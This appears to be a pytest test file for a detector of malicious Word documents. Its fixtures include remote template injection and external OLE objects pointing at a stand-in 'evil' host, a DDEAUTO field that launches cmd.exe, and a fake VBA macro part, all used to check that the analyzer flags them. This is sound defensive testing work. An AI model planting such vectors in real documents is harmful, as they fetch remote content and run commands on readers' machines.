from awake import docx_rules
from conftest import docx_with

REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
REL_TYPE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"


def rels(rel_type, target, external=True):
    mode = ' TargetMode="External"' if external else ""
    return (f'<?xml version="1.0"?><Relationships xmlns="{REL_NS}">'
            f'<Relationship Id="rId9" Type="{REL_TYPE}{rel_type}" Target="{target}"{mode}/></Relationships>')


def rules(report):
    return {f.rule for f in report.findings}


def test_clean_document_has_no_findings(clean_docx):
    report = docx_rules.analyze(clean_docx)
    assert report.findings == []
    assert report.verdict == 0


def test_template_injection_is_high(clean_docx):
    data = docx_with(clean_docx, {"word/_rels/settings.xml.rels": rels("attachedTemplate", "http://evil/t.dotm")})
    report = docx_rules.analyze(data)
    assert "template_injection" in rules(report)
    assert report.verdict == 1


def test_attribute_order_does_not_matter(clean_docx):
    xml = (f'<Relationships xmlns="{REL_NS}"><Relationship TargetMode="External" Id="r1" '
           f'Type="{REL_TYPE}oleObject" Target="http://evil/x.rtf"/></Relationships>')
    report = docx_rules.analyze(docx_with(clean_docx, {"word/_rels/document.xml.rels": xml}))
    assert "remote_object" in rules(report)


def test_external_hyperlink_is_not_flagged(clean_docx):
    data = docx_with(clean_docx, {"word/_rels/footer1.xml.rels": rels("hyperlink", "https://example.com")})
    assert docx_rules.analyze(data).verdict == 0


def test_internal_template_is_not_flagged(clean_docx):
    data = docx_with(clean_docx, {"word/_rels/settings.xml.rels": rels("attachedTemplate", "Normal.dotm", external=False)})
    assert docx_rules.analyze(data).verdict == 0


def test_dde_field(clean_docx):
    xml = ('<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r>'
           '<w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText>'
           '</w:r></w:p></w:body></w:document>')
    report = docx_rules.analyze(docx_with(clean_docx, {"word/document.xml": xml}))
    assert "dde_field" in rules(report)
    assert report.verdict == 1


def test_the_word_dde_in_text_is_not_a_field(clean_docx):
    xml = ('<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r>'
           '<w:t>DDE protocol overview</w:t></w:r></w:p></w:body></w:document>')
    assert docx_rules.analyze(docx_with(clean_docx, {"word/document.xml": xml})).verdict == 0


def test_vba_macro(clean_docx):
    report = docx_rules.analyze(docx_with(clean_docx, {"word/vbaProject.bin": b"\x00" * 16}))
    assert "vba_macro" in rules(report)
    assert report.verdict == 1


def test_embedded_object_is_medium_only(clean_docx):
    report = docx_rules.analyze(docx_with(clean_docx, {"word/embeddings/oleObject1.bin": b"\x00"}))
    assert "embedded_object" in rules(report)
    assert report.verdict == 0


def test_ole_disguised_as_docx():
    report = docx_rules.analyze(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100)
    assert rules(report) == {"extension_mismatch"}


def test_not_a_zip():
    assert rules(docx_rules.analyze(b"plain text")) == {"extension_mismatch"}
